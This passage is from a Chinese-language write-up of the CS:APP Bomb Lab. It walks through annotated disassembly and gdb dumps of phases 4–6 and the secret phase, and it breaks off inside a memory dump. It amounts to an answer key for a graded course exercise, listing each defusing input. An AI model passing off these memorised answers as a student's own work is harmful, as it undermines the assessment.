\u0026lt;phase_3+99\u0026gt;: \u0026#34;\\270G\\001\u0026#34; Phase_4 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 000000000040100c \u0026lt;phase_4\u0026gt;: 40100c:\t48 83 ec 18 sub $0x18,%rsp //入栈，栈指针减少18 401010:\t48 8d 4c 24 0c lea 0xc(%rsp),%rcx //rcx=rsp+12 401015:\t48 8d 54 24 08 lea 0x8(%rsp),%rdx //rdx=rsp+8 40101a:\tbe cf 25 40 00 mov $0x4025cf,%esi //esi=0x4025cf 40101f:\tb8 00 00 00 00 mov $0x0,%eax //eax=0 401024:\te8 c7 fb ff ff call 400bf0 \u0026lt;__isoc99_sscanf@plt\u0026gt; 401029:\t83 f8 02 cmp $0x2,%eax //比较eax和2 40102c:\t75 07 jne 401035 \u0026lt;phase_4+0x29\u0026gt; //如果不相等，跳转到0x401035即爆炸 40102e:\t83 7c 24 08 0e cmpl $0xe,0x8(%rsp) //相等则比较(%rsp+8)的内存值和14 401033:\t76 05 jbe 40103a \u0026lt;phase_4+0x2e\u0026gt; //如果(%rsp+8)\u0026lt;=14,跳转到0x40103a 401035:\te8 00 04 00 00 call 40143a \u0026lt;explode_bomb\u0026gt; //否则，爆炸 40103a:\tba 0e 00 00 00 mov $0xe,%edx //edx=14 参数3 40103f:\tbe 00 00 00 00 mov $0x0,%esi //esi=0 参数2 401044:\t8b 7c 24 08 mov 0x8(%rsp),%edi //edi=*(rsp+8) 参数1 401048:\te8 81 ff ff ff call 400fce \u0026lt;func4\u0026gt; //调用func4函数 40104d:\t85 c0 test %eax,%eax //判断返回值是否为0 40104f:\t75 07 jne 401058 \u0026lt;phase_4+0x4c\u0026gt; //如果不等于0，跳转到401058即爆炸 401051:\t83 7c 24 0c 00 cmpl $0x0,0xc(%rsp) //比较*(rsp+12)和0 401056:\t74 05 je 40105d \u0026lt;phase_4+0x51\u0026gt; //如果相等，跳转到40105d 401058:\te8 dd 03 00 00 call 40143a \u0026lt;explode_bomb\u0026gt; 40105d:\t48 83 c4 18 add $0x18,%rsp //出栈 401061:\tc3 ret 很明显要通过此关必须在调用func4后返回0，而且第二个参数要等于0，所以只需通过调整第一个参数的值来使得func4函数返回0\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 0000000000400fce \u0026lt;func4\u0026gt;: 400fce:\t48 83 ec 08 sub $0x8,%rsp //入栈 400fd2:\t89 d0 mov %edx,%eax //eax=edx=14 rsi=0 edi=第一个参数 400fd4:\t29 f0 sub %esi,%eax //eax=eax-esi=14 400fd6:\t89 c1 mov %eax,%ecx //ecx=eax=14 400fd8:\tc1 e9 1f shr $0x1f,%ecx //ecx逻辑右移31位 ecx=0 400fdb:\t01 c8 add %ecx,%eax //eax=eax+ecx=14 400fdd:\td1 f8 sar %eax //eax算数右移一位 eax=7 400fdf:\t8d 0c 30 lea (%rax,%rsi,1),%ecx //ecx=rsi+rax=7 400fe2:\t39 f9 cmp %edi,%ecx //比较edi和ecx=7 400fe4:\t7e 0c jle 400ff2 \u0026lt;func4+0x24\u0026gt; //若edi\u0026gt;=ecx 跳转到0x400ff2 400fe6:\t8d 51 ff lea -0x1(%rcx),%edx //否则，edx=rcx-1=6 400fe9:\te8 e0 ff ff ff call 400fce \u0026lt;func4\u0026gt; //调用func4函数 edi esi=0 edx=13 400fee:\t01 c0 add %eax,%eax //eax=eax*2 400ff0:\teb 15 jmp 401007 \u0026lt;func4+0x39\u0026gt; 跳转到0x401007 400ff2:\tb8 00 00 00 00 mov $0x0,%eax //eax=0 400ff7:\t39 f9 cmp %edi,%ecx //比较edi和ecx=7 400ff9:\t7d 0c jge 401007 \u0026lt;func4+0x39\u0026gt; //若ecx\u0026gt;=edi 跳转到0x401007 400ffb:\t8d 71 01 lea 0x1(%rcx),%esi //若ecx\u0026lt;edi，esi=rcx+1=8 400ffe:\te8 cb ff ff ff call 400fce \u0026lt;func4\u0026gt; //调用func4函数 edi esi=8 edx=14 401003:\t8d 44 00 01 lea 0x1(%rax,%rax,1),%eax //eax=rax+rax+1 不能经过这条指令，edi必须小于等于7 401007:\t48 83 c4 08 add $0x8,%rsp //出栈 40100b:\tc3 ret 首先edi寄存器也就是我们输入的第一个参数必须小于等于7，\nlea 0x1(%rax,%rax,1),%eax这条指令不能执行，一旦执行这条执行，那么eax寄存器就不可能等于0，同时我们观察到两个判断语句都有等于条件，于是我们把第一个参数设置为7，很顺利地使eax寄存器等于0，当然还有其它的可能性，可以一一去试。\n1 7 0 | Phase_5 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 0000000000401062 \u0026lt;phase_5\u0026gt;: 401062:\t53 push %rbx //保存调用者寄存器 401063:\t48 83 ec 20 sub $0x20,%rsp //入栈，栈指针减少32 401067:\t48 89 fb mov %rdi,%rbx //rbx=rdi 第一个参数 40106a:\t64 48 8b 04 25 28 00 mov %fs:0x28,%rax //将 %fs 段寄存器中偏移地址为 0x28 的内容加载到 %rax 寄存器中。 401071:\t00 00 //%fs 是一个段寄存器，通常用于访问线程本地存储（Thread Local Storage, TLS） 401073:\t48 89 44 24 18 mov %rax,0x18(%rsp) //将其放在栈上 *(rsp+24)=rax 401078:\t31 c0 xor %eax,%eax // eax=0 40107a:\te8 9c 02 00 00 call 40131b \u0026lt;string_length\u0026gt; 40107f:\t83 f8 06 cmp $0x6,%eax //字符串的长度与6比较 401082:\t74 4e je 4010d2 \u0026lt;phase_5+0x70\u0026gt; //若字符串的长度等于6，跳转到0x4010d2 401084:\te8 b1 03 00 00 call 40143a \u0026lt;explode_bomb\u0026gt; //否则，爆炸 401089:\teb 47 jmp 4010d2 \u0026lt;phase_5+0x70\u0026gt; 40108b:\t0f b6 0c 03 movzbl (%rbx,%rax,1),%ecx //从(rax+rbx)处读取的1字节数据零扩展到ecx中 ecx=0x69 eax=0 40108f:\t88 0c 24 mov %cl,(%rsp) //将cl的值存入rsp所指的地址中(rcx的低8位) *(%rsp)=0x69 401092:\t48 8b 14 24 mov (%rsp),%rdx //rdx=*(rsp)=0x69 401096:\t83 e2 0f and $0xf,%edx //edx=edx\u0026amp;0xf=9 401099:\t0f b6 92 b0 24 40 00 movzbl 0x4024b0(%rdx),%edx //从(rdx+0x4024b0)处读取的1字节数据零扩展到edx,edx=0xb9 4010a0:\t88 54 04 10 mov %dl,0x10(%rsp,%rax,1) //将dl(edx的低8位)存入((rax+rsp)+16)地址中 *(rsp+16+rax)=0xb9 4010a4:\t48 83 c0 01 add $0x1,%rax //rax=rax+1=1 4010a8:\t48 83 f8 06 cmp $0x6,%rax //比较rax和6 4010ac:\t75 dd jne 40108b \u0026lt;phase_5+0x29\u0026gt; //若rax!=6，则跳转到0x40108b 这部分的循环相当于以下C程序： for(int rax=0;rax!=6;rax++){ target[rax]=array[input[rax]\u0026amp;0xf]; } *(rsp+16)=0xb9 *(rsp+17)=0xbf *(rsp+18)=0xbe *(rsp+19)=0xb5 *(rsp+20)=0xb6 *(rsp+21)=0xb7 4010ae:\tc6 44 24 16 00 movb $0x0,0x16(%rsp) //否则，将字节0x0存入(rsp+22)地址中 4010b3:\tbe 5e 24 40 00 mov $0x40245e,%esi //esi=0x40245e 4010b8:\t48 8d 7c 24 10 lea 0x10(%rsp),%rdi //rdi=rsp+16 *(rsp+16)=0xbb 4010bd:\te8 76 02 00 00 call 401338 \u0026lt;strings_not_equal\u0026gt; 4010c2:\t85 c0 test %eax,%eax //判断返回值是否为0 4010c4:\t74 13 je 4010d9 \u0026lt;phase_5+0x77\u0026gt; //返回值为0，则跳转到0x4010d9 4010c6:\te8 6f 03 00 00 call 40143a \u0026lt;explode_bomb\u0026gt; //否则，爆炸 4010cb:\t0f 1f 44 00 00 nopl 0x0(%rax,%rax,1) 4010d0:\teb 07 jmp 4010d9 \u0026lt;phase_5+0x77\u0026gt; 4010d2:\tb8 00 00 00 00 mov $0x0,%eax //eax=0 4010d7:\teb b2 jmp 40108b \u0026lt;phase_5+0x29\u0026gt; //跳转到0x40108b 4010d9:\t48 8b 44 24 18 mov 0x18(%rsp),%rax //rax=*(rsp+24) 4010de:\t64 48 33 04 25 28 00 xor %fs:0x28,%rax //rax与%fs段寄存器中偏移地址为0x28的内容异或来检查内容是否被修改 4010e5:\t00 00 4010e7:\t74 05 je 4010ee \u0026lt;phase_5+0x8c\u0026gt; //如果相等，则跳转到0x4010ee 4010e9:\te8 42 fa ff ff call 400b30 \u0026lt;__stack_chk_fail@plt\u0026gt; //否则调用错误处理历程 4010ee:\t48 83 c4 20 add $0x20,%rsp //出栈，栈指针增加32 4010f2:\t5b pop %rbx 4010f3:\tc3 ret 关键代码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 40108b:\t0f b6 0c 03 movzbl (%rbx,%rax,1),%ecx //从(rax+rbx)处读取的1字节数据零扩展到ecx中 ecx=0x69 eax=0 40108f:\t88 0c 24 mov %cl,(%rsp) //将cl的值存入rsp所指的地址中(rcx的低8位) *(%rsp)=0x69 401092:\t48 8b 14 24 mov (%rsp),%rdx //rdx=*(rsp)=0x69 401096:\t83 e2 0f and $0xf,%edx //edx=edx\u0026amp;0xf=9 401099:\t0f b6 92 b0 24 40 00 movzbl 0x4024b0(%rdx),%edx //从(rdx+0x4024b0)处读取的1字节数据零扩展到edx,edx=0xb9 4010a0:\t88 54 04 10 mov %dl,0x10(%rsp,%rax,1) //将dl(edx的低8位)存入((rax+rsp)+16)地址中 *(rsp+16+rax)=0xb9 4010a4:\t48 83 c0 01 add $0x1,%rax //rax=rax+1=1 4010a8:\t48 83 f8 06 cmp $0x6,%rax //比较rax和6 4010ac:\t75 dd jne 40108b \u0026lt;phase_5+0x29\u0026gt; //若rax!=6，则跳转到0x40108b 这部分的循环相当于以下C程序： for(int rax=0;rax!=6;rax++){ target[rax]=array[input[rax]\u0026amp;0xf]; } 就是要使得所输入的字符串的十六进制取后四位，并作为array数组的下标，让array数组与目标字符串相等。\n目标字符串在0x40245e内存地址中，即0x666c79657273 \u0026ldquo;flyers\u0026rdquo;\narray数组在0x4024b0内存地址中,如下所示。\n1 2 3 4 5 6 7 8 9 10 11 12 (gdb) x/16c 0x4024b0 0x4024b0 \u0026lt;array.3449\u0026gt;: 109 \u0026#39;m\u0026#39; 97 \u0026#39;a\u0026#39; 100 \u0026#39;d\u0026#39; 117 \u0026#39;u\u0026#39; 105 \u0026#39;i\u0026#39; 101 \u0026#39;e\u0026#39; 114 \u0026#39;r\u0026#39; 115 \u0026#39;s\u0026#39; 0x4024b8 \u0026lt;array.3449+8\u0026gt;: 110 \u0026#39;n\u0026#39; 102 \u0026#39;f\u0026#39; 111 \u0026#39;o\u0026#39; 116 \u0026#39;t\u0026#39; 118 \u0026#39;v\u0026#39; 98 \u0026#39;b\u0026#39; 121 \u0026#39;y\u0026#39; 108 \u0026#39;l\u0026#39; (gdb) x/s 0x40245e 0x40245e: \u0026#34;flyers\u0026#34; 0x4024b9 f 0x4024bf l 0x4024be y 0x4024b5 e 0x4024b6 r 0x4024b7 s array数组的表格如下\narray[i]的i 对应的char input[rax] 0 m 0x*0 1 a 0x*1 2 d 0x*2 3 u 0x*3 4 i 0x*4 5 e 0x*5 6 r 0x*6 7 s 0x*7 8 n 0x*8 9 f 0x*9 a o 0x*a b t 0x*b c v 0x*c d b 0x*d e y 0x*e f l 0x*f 所以输入的字符串只需找到表格中对应flyers字符串的input[rax]任意组合即可，比如ionefg(0x69 0x6f 0x6e 0x65 0x66 0x67)\nPhase_6 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 00000000004010f4 \u0026lt;phase_6\u0026gt;: 4010f4:\t41 56 push %r14 4010f6:\t41 55 push %r13 4010f8:\t41 54 push %r12 4010fa:\t55 push %rbp 4010fb:\t53 push %rbx 4010fc:\t48 83 ec 50 sub $0x50,%rsp //入栈，栈指针减少80 401100:\t49 89 e5 mov %rsp,%r13 //r13=rsp 401103:\t48 89 e6 mov %rsp,%rsi //rsi=rsp 401106:\te8 51 03 00 00 call 40145c \u0026lt;read_six_numbers\u0026gt; //读取6个数字 40110b:\t49 89 e6 mov %rsp,%r14 //r14=rsp 40110e:\t41 bc 00 00 00 00 mov $0x0,%r12d //r12d=0 401114:\t4c 89 ed mov %r13,%rbp //rbp=r13 rsp rsp+4 401117:\t41 8b 45 00 mov 0x0(%r13),%eax //eax=*(r13) 40111b:\t83 e8 01 sub $0x1,%eax //eax=eax-1 40111e:\t83 f8 05 cmp $0x5,%eax //eax与5比较 401121:\t76 05 jbe 401128 \u0026lt;phase_6+0x34\u0026gt; //若eax\u0026lt;=5，跳转到0x401128 401123:\te8 12 03 00 00 call 40143a \u0026lt;explode_bomb\u0026gt; //否则，爆炸 401128:\t41 83 c4 01 add $0x1,%r12d //r12d=r12d+1=1 2 40112c:\t41 83 fc 06 cmp $0x6,%r12d //r12d与6比较 401130:\t74 21 je 401153 \u0026lt;phase_6+0x5f\u0026gt; //若r12d=6，则跳转到0x401153 401132:\t44 89 e3 mov %r12d,%ebx //ebx=r12d=1 2 401135:\t48 63 c3 movslq %ebx,%rax //rax=ebx 1 2 401138:\t8b 04 84 mov (%rsp,%rax,4),%eax //eax=*(rsp+rax*4) 40113b:\t39 45 00 cmp %eax,0x0(%rbp) 40113e:\t75 05 jne 401145 \u0026lt;phase_6+0x51\u0026gt; //若*(rbp)!=*(rsp+rax*4),跳转到0x401145 401140:\te8 f5 02 00 00 call 40143a \u0026lt;explode_bomb\u0026gt; //否则，爆炸 401145:\t83 c3 01 add $0x1,%ebx //ebx++ 2 401148:\t83 fb 05 cmp $0x5,%ebx 40114b:\t7e e8 jle 401135 \u0026lt;phase_6+0x41\u0026gt; //若ebx\u0026lt;=5,跳转到0x401135 40114d:\t49 83 c5 04 add $0x4,%r13 //r13+=4 401151:\teb c1 jmp 401114 \u0026lt;phase_6+0x20\u0026gt; //跳转到0x401114 #这段代码的目的就是让所有参数要小于等于6，并且不得重复 401153:\t48 8d 74 24 18 lea 0x18(%rsp),%rsi //rsi=rsp+24 401158:\t4c 89 f0 mov %r14,%rax //rax=r14 rsp 40115b:\tb9 07 00 00 00 mov $0x7,%ecx //ecx=7 401160:\t89 ca mov %ecx,%edx //edx=ecx=7 401162:\t2b 10 sub (%rax),%edx //edx=edx-*(rax) 7-*(rsp) 401164:\t89 10 mov %edx,(%rax) //*(rax)=edx *(rsp)=7-*(rsp) 401166:\t48 83 c0 04 add $0x4,%rax //rax=rax+4 rsp+4 40116a:\t48 39 f0 cmp %rsi,%rax //rax与rsi比较 40116d:\t75 f1 jne 401160 \u0026lt;phase_6+0x6c\u0026gt; //若rax!=rsi，则跳转到0x401160 六次循环 #这段代码就是处理参数 #相当于for(int i=0;i\u0026lt;6;i++){ #input[i]=7-input[i]; #} 40116f:\tbe 00 00 00 00 mov $0x0,%esi //esi=0 401174:\teb 21 jmp 401197 \u0026lt;phase_6+0xa3\u0026gt; //跳转到0x401197 401176:\t48 8b 52 08 mov 0x8(%rdx),%rdx //rdx=*(rdx+8) *(0x6032d0+8) 40117a:\t83 c0 01 add $0x1,%eax //eax++ 2 40117d:\t39 c8 cmp %ecx,%eax //比较ecx和eax的大小 *(rsp)与2大小 40117f:\t75 f5 jne 401176 \u0026lt;phase_6+0x82\u0026gt; //若ecx!=eax，则跳转到0x401176 401181:\teb 05 jmp 401188 \u0026lt;phase_6+0x94\u0026gt; //跳转到0x401188 401183:\tba d0 32 60 00 mov $0x6032d0,%edx //edx=0x6032d0 401188:\t48 89 54 74 20 mov %rdx,0x20(%rsp,%rsi,2) //*(rsp+rsi*2+32)=rdx 40118d:\t48 83 c6 04 add $0x4,%rsi //rsi=rsi+4 4 401191:\t48 83 fe 18 cmp $0x18,%rsi //rsi与24比较 401195:\t74 14 je 4011ab \u0026lt;phase_6+0xb7\u0026gt; //若rsi=24，跳转到0x4011ab 401197:\t8b 0c 34 mov (%rsp,%rsi,1),%ecx //ecx=*(rsp+rsi) 指针偏移，依次获取6个数 *(rsp) *(rsp+4) 40119a:\t83 f9 01 cmp $0x1,%ecx //比较ecx与1的大小 40119d:\t7e e4 jle 401183 \u0026lt;phase_6+0x8f\u0026gt; //若ecx\u0026lt;=1，跳转到0x401183 即当处理后的*(rsp)=1时 40119f:\tb8 01 00 00 00 mov $0x1,%eax //eax=1 4011a4:\tba d0 32 60 00 mov $0x6032d0,%edx //edx=0x6032d0 4011a9:\teb cb jmp 401176 \u0026lt;phase_6+0x82\u0026gt; //跳转到0x401176 #这段代码不太好着手，根据我们输入的1 2 3 4 5 6带入运行，经过之前的处理后编程了6 5 4 3 2 1， #这段代码的关键在于0x6032d0这个地址代表的含义， #在处理第一个参数6时，发现在不断嵌套使用地址，优点像链表，利用gdb查看，这个地址的值发现： #(gdb) x/24w 0x6032d0 #0x6032d0 \u0026lt;node1\u0026gt;: 0x0000014c 0x00000001 0x006032e0 0x00000000 #0x6032e0 \u0026lt;node2\u0026gt;: 0x000000a8 0x00000002 0x006032f0 0x00000000 #0x6032f0 \u0026lt;node3\u0026gt;: 0x0000039c 0x00000003 0x00603300 0x00000000 #0x603300 \u0026lt;node4\u0026gt;: 0x000002b3 0x00000004 0x00603310 0x00000000 #0x603310 \u0026lt;node5\u0026gt;: 0x000001dd 0x00000005 0x00603320 0x00000000 #0x603320 \u0026lt;node6\u0026gt;: 0x000001bb 0x00000006 0x00000000 0x00000000 #在这里，我的输入是1 2 3 4 5 6 #我们看到打印出来的结果，每个node里第2个四字节的部分和我们的输入吻合； #而第三个四字节的部分则是下一个node的起始地址，最后一个四字节的部分则为0， #考虑到内存对齐，我们大概能推测出，这应该是一个链表，而我们的输入的数字与在第二个四字节的地方的数据有关， #第一个四字节的内容表示的是什么待确定 # 这个结构体有点类似链表： # struct { # int sth; // 某四字节内容 # int input; // 与我们的输入有关 # node* next; // 下一个node地址 # } node; #这么看下来这段代码就是将处理后参数所对应node的起始地址存储到首地址为rsp+0x20，尾地址为rsp+0x50的地方 #(gdb) x/12w $rsp+0x20 #0x7fffffffd8c0: 0x00603320 0x00000000 0x00603310 0x00000000 #0x7fffffffd8d0: 0x00603300 0x00000000 0x006032f0 0x00000000 #0x7fffffffd8e0: 0x006032e0 0x00000000 0x006032d0 0x00000000 4011ab:\t48 8b 5c 24 20 mov 0x20(%rsp),%rbx //rbx=*(rsp+0x20) 0x00603320 4011b0:\t48 8d 44 24 28 lea 0x28(%rsp),%rax //rax=(rsp+0x28) 4011b5:\t48 8d 74 24 50 lea 0x50(%rsp),%rsi //rsi=(rsp+0x50) 4011ba:\t48 89 d9 mov %rbx,%rcx //rcx=rbx=*(rsp+0x20) 0x00603320 4011bd:\t48 8b 10 mov (%rax),%rdx //rdx=*(rax)=*(rsp+0x28) 0x00603310 4011c0:\t48 89 51 08 mov %rdx,0x8(%rcx) //*(rcx+8)=rdx *(*(rsp+0x20)+8)=*(rsp+0x28) //*0x00603328=0x00603310 *0x00603318=0x603300 4011c4:\t48 83 c0 08 add $0x8,%rax //rax+=8 (rsp+0x30) 4011c8:\t48 39 f0 cmp %rsi,%rax 4011cb:\t74 05 je 4011d2 \u0026lt;phase_6+0xde\u0026gt; //若rax=rsi,跳转到0x4011d2 4011cd:\t48 89 d1 mov %rdx,%rcx //rcx=rdx *(rsp+0x28) 4011d0:\teb eb jmp 4011bd \u0026lt;phase_6+0xc9\u0026gt; //跳转到0x4011bd #这段代码可以简化为一个for循环，这个循环用来将链表的结点重新调整至第一个参数的结点为头节点， #后面的参数依次链接在这个头结点后的链表： #for(int i=0;i\u0026lt;6;i++){ #node[i]-\u0026gt;next=node[i+1]; #} #结果如下 #(gdb) x/24w 0x6032d0 #0x6032d0 \u0026lt;node1\u0026gt;: 0x0000014c 0x00000001 0x006032e0 0x00000000 #0x6032e0 \u0026lt;node2\u0026gt;: 0x000000a8 0x00000002 0x006032d0 0x00000000 #0x6032f0 \u0026lt;node3\u0026gt;: 0x0000039c 0x00000003 0x006032e0 0x00000000 #0x603300 \u0026lt;node4\u0026gt;: 0x000002b3 0x00000004 0x006032f0 0x00000000 #0x603310 \u0026lt;node5\u0026gt;: 0x000001dd 0x00000005 0x00603300 0x00000000 #0x603320 \u0026lt;node6\u0026gt;: 0x000001bb 0x00000006 0x00603310 0x00000000 4011d2:\t48 c7 42 08 00 00 00 movq $0x0,0x8(%rdx) ///*(rdx+8)=0 4011d9:\t00 4011da:\tbd 05 00 00 00 mov $0x5,%ebp //ebp=5 4011df:\t48 8b 43 08 mov 0x8(%rbx),%rax //rax=*(rbx+8)=头结点的下一个结点rbx=*(rsp+0x20) 4011e3:\t8b 00 mov (%rax),%eax //eax=*(rax) 下一结点的sth内容 4011e5:\t39 03 cmp %eax,(%rbx) //当前结点的sth与下一结点的sth内容比较 4011e7:\t7d 05 jge 4011ee \u0026lt;phase_6+0xfa\u0026gt; //若*(rbx)\u0026gt;=eax，则跳转到0x4011ee 4011e9:\te8 4c 02 00 00 call 40143a \u0026lt;explode_bomb\u0026gt; //否则，爆炸 4011ee:\t48 8b 5b 08 mov 0x8(%rbx),%rbx //rbx=*(rbx+8) 指向下一个结点 4011f2:\t83 ed 01 sub $0x1,%ebp //ebp-- 4011f5:\t75 e8 jne 4011df \u0026lt;phase_6+0xeb\u0026gt; //若不等于0，则跳转到0x4011df 4011f7:\t48 83 c4 50 add $0x50,%rsp //出栈，栈指针增加80 #这段代码主要是比较每个结点和下一个结点的sth值(结点的首四字节内容)，当前结点的sth要大于等于下一结点的sth， #所以我们需要将sth的值排序从大到小排序,排序后所结点对应序号的序列就是我们要输入的参数值和对应顺序， #即4 3 2 1 6 5 注意参数被处理过，不要写成3 4 5 6 1 2 4011fb:\t5b pop %rbx 4011fc:\t5d pop %rbp 4011fd:\t41 5c pop %r12 4011ff:\t41 5d pop %r13 401201:\t41 5e pop %r14 401203:\tc3 ret 注释中一般都只写了第一次循环各寄存器所对应的值，若有多个值则是循环了多次，一般循环两三次就能看出整个函数的用意。整个phase_6调试所输入的参数为1 2 3 4 5 6\nBonus 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 00000000004015c4 \u0026lt;phase_defused\u0026gt;: 4015c4:\t48 83 ec 78 sub $0x78,%rsp 4015c8:\t64 48 8b 04 25 28 00 mov %fs:0x28,%rax 4015cf:\t00 00 4015d1:\t48 89 44 24 68 mov %rax,0x68(%rsp) 4015d6:\t31 c0 xor %eax,%eax 4015d8:\t83 3d 81 21 20 00 06 cmpl $0x6,0x202181(%rip) # 603760 \u0026lt;num_input_strings\u0026gt; 4015df:\t75 5e jne 40163f \u0026lt;phase_defused+0x7b\u0026gt; 4015e1:\t4c 8d 44 24 10 lea 0x10(%rsp),%r8 4015e6:\t48 8d 4c 24 0c lea 0xc(%rsp),%rcx 4015eb:\t48 8d 54 24 08 lea 0x8(%rsp),%rdx 4015f0:\tbe 19 26 40 00 mov $0x402619,%esi #地址的值是\u0026#34;%d %d %s\u0026#34; 4015f5:\tbf 70 38 60 00 mov $0x603870,%edi #地址的值是\u0026#34;7 0\u0026#34;这正是第4关的key，推测从这关进入彩蛋 4015fa:\te8 f1 f5 ff ff call 400bf0 \u0026lt;__isoc99_sscanf@plt\u0026gt; 4015ff:\t83 f8 03 cmp $0x3,%eax 401602:\t75 31 jne 401635 \u0026lt;phase_defused+0x71\u0026gt; #eax!=3，就跳转到末尾 401604:\tbe 22 26 40 00 mov $0x402622,%esi #esi=0x402622 该地址对应\u0026#34;DrEvil\u0026#34; 401609:\t48 8d 7c 24 10 lea 0x10(%rsp),%rdi #rdi=*(rsp+16) 40160e:\te8 25 fd ff ff call 401338 \u0026lt;strings_not_equal\u0026gt; #判断字符串是否相等 401613:\t85 c0 test %eax,%eax 401615:\t75 1e jne 401635 \u0026lt;phase_defused+0x71\u0026gt; #如果不等，就跳转到末尾 401617:\tbf f8 24 40 00 mov $0x4024f8,%edi 40161c:\te8 ef f4 ff ff call 400b10 \u0026lt;puts@plt\u0026gt; 401621:\tbf 20 25 40 00 mov $0x402520,%edi 401626:\te8 e5 f4 ff ff call 400b10 \u0026lt;puts@plt\u0026gt; 40162b:\tb8 00 00 00 00 mov $0x0,%eax 401630:\te8 0d fc ff ff call 401242 \u0026lt;secret_phase\u0026gt; #因此进入彩蛋需要在第4关的答案后面添上\u0026#34;DrEvil\u0026#34;字符串 401635:\tbf 58 25 40 00 mov $0x402558,%edi 40163a:\te8 d1 f4 ff ff call 400b10 \u0026lt;puts@plt\u0026gt; 40163f:\t48 8b 44 24 68 mov 0x68(%rsp),%rax 401644:\t64 48 33 04 25 28 00 xor %fs:0x28,%rax 40164b:\t00 00 40164d:\t74 05 je 401654 \u0026lt;phase_defused+0x90\u0026gt; 40164f:\te8 dc f4 ff ff call 400b30 \u0026lt;__stack_chk_fail@plt\u0026gt; 401654:\t48 83 c4 78 add $0x78,%rsp 401658:\tc3 ret 0000000000401204 \u0026lt;fun7\u0026gt;: 401204:\t48 83 ec 08 sub $0x8,%rsp 401208:\t48 85 ff test %rdi,%rdi 40120b:\t74 2b je 401238 \u0026lt;fun7+0x34\u0026gt; #若rdi=0，则跳转 40120d:\t8b 17 mov (%rdi),%edx #edx=*(rdi)=0x24 40120f:\t39 f2 cmp %esi,%edx 401211:\t7e 0d jle 401220 \u0026lt;fun7+0x1c\u0026gt; #若edx\u0026lt;=esi，则跳转 401213:\t48 8b 7f 08 mov 0x8(%rdi),%rdi #rdi=*(rdi+8) 401217:\te8 e8 ff ff ff call 401204 \u0026lt;fun7\u0026gt; func7(0x00603110,input) 40121c:\t01 c0 add %eax,%eax 40121e:\teb 1d jmp 40123d \u0026lt;fun7+0x39\u0026gt; 401220:\tb8 00 00 00 00 mov $0x0,%eax #eax=0 401225:\t39 f2 cmp %esi,%edx 401227:\t74 14 je 40123d \u0026lt;fun7+0x39\u0026gt; #若edx=esi，则跳转 input不能等于0x24 401229:\t48 8b 7f 10 mov 0x10(%rdi),%rdi #rdi=*(rdi+16) 40122d:\te8 d2 ff ff ff call 401204 \u0026lt;fun7\u0026gt; 401232:\t8d 44 00 01 lea 0x1(%rax,%rax,1),%eax #eax=rax+rax+1 401236:\teb 05 jmp 40123d \u0026lt;fun7+0x39\u0026gt; #跳转 401238:\tb8 ff ff ff ff mov $0xffffffff,%eax 40123d:\t48 83 c4 08 add $0x8,%rsp 401241:\tc3 ret #等价c语言： int fun7(int input, Node* addr){ if(addr == 0){ return -1; } int v = addr-\u0026gt;value; if (v == input){ return 0; }else if( v \u0026lt; input){ return 1 + 2*fun7(input, addr-\u0026gt;right); }else{ return 2*func7(input, addr-\u0026gt;left); } } #纵观eax值的设置，一共有三处，esi\u0026lt;edx时，eax=2*eax； esi=edx时，eax=0；esi\u0026gt;edx时，eax=rax+rax+1，在它们的前面还会嵌套调用func7 #若想让eax=2，那么只有让最深层的func7调用eax=0，然后调用eax=rax+rax+1，最后最外面这层func7函数调用eax=2*eax，这样刚好等于2 #所以input\u0026lt;0x24 input\u0026gt;0x8 input=0x16 #这里的设置与phase_6的设置有些类似，涉及到了地址嵌套调用，使用gdb查看相应的内存地址范围的值，一目了然。 #(gdb) x/120w 0x6030f0 #0x6030f0 \u0026lt;n1\u0026gt;: 0x00000024 0x00000000 0x00603110 0x00000000 #0x603100 \u0026lt;n1+16\u0026gt;: 0x00603130 0x00000000 0x00000000 0x00000000 #0x603110 \u0026lt;n21\u0026gt;: 0x00000008 0x00000000 0x00603190 0x00000000 #0x603120 \u0026lt;n21+16\u0026gt;: 0x00603150 0x00000000 0x00000000 0x00000000 #0x603130 \u0026lt;n22\u0026gt;: 0x00000032 0x00000000 0x00603170 0x00000000 #0x603140 \u0026lt;n22+16\u0026gt;: 0x006031b0 0x00000000 0x00000000 0x00000000 #0x603150 \u0026lt;n32\u0026gt;: 0x00000016 0x00000000 0x00603270 0x00000000 #0x603160 \u0026lt;n32+16\u0026gt;: 0x00603230 0x00000000 0x00000000 0x00000000 #0x603170 \u0026lt;n33\u0026gt;: 0x0000002d 0x00000000 0x006031d0 0x00000000 #0x603180 \u0026lt;n33+16\u0026gt;: 0x00603290 0x00000000 0x00000000 0x00000000 #0x603190 \u0026lt;n31\u0026gt;: 0x00000006 0x00000000 0x006031f0 0x00000000 #0x6031a0 \u0026lt;n31+16\u0026gt;: 0x00603250 0x00000000 0x00000000 0x00000000 #0x6031b0 \u0026lt;n34\u0026gt;: 0x0000006b 0x00000000 0x00603210 0x00000000 #0x6031c0 \u0026lt;n34+16\u0026gt;: 0x006032b0 0x00000000 0x00000000 0x00000000 #0x6031d0 \u0026lt;n45\u0026gt;: 0x00000028 0x00000000 0x00000000 0x00000000 #0x6031e0 